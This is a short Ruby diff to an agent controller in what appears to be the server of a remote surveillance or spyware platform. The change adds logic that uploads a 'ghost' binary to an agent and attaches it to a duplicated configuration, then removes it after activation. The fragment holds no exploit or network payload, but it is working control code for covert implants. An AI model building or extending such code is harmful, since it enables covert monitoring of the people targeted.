@@ -7,8 +7,6 @@ require_relative '../alert'
 
 require 'rcs-common/crypt'
 
-require 'ipaddr'
-
 module RCS
 module DB
 
@@ -417,6 +415,14 @@ class AgentController < RESTController
         config.sent = Time.now.getutc.to_i if config.sent.nil? or config.sent == 0
         config.activated = Time.now.getutc.to_i
         config.save
+
+        # remove the ghost after activating it
+        if config.is_ghost_present?
+          agent.configs.create!(config: config.config)
+          config = agent.configs.last
+          config.remove_ghost
+        end
+
         trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
     end
     
@@ -661,7 +667,7 @@ class AgentController < RESTController
     build.load({'_id' => factory._id})
     build.unpack
 
-    sync = @params['sync'].collect {|i| IPAddr.new(i).to_i}
+    sync = @params['sync']
     id = agent.ident.slice(4..-1).to_i
     instance = agent.instance.slice(0..7).to_i(16)
 
@@ -673,6 +679,14 @@ class AgentController < RESTController
     agent.upload_requests.create!({filename: 'ghost', _grid: [RCS::DB::GridFS.put(content, {filename: 'ghost', content_type: 'application/octet-stream'})] })
 
     build.clean
+
+    # duplicate the current config
+    config = agent.configs.last
+    agent.configs.create!(config: config.config)
+
+    # get the duplicated and add the ghost
+    config = agent.configs.last
+    config.add_ghost
 
   end
 
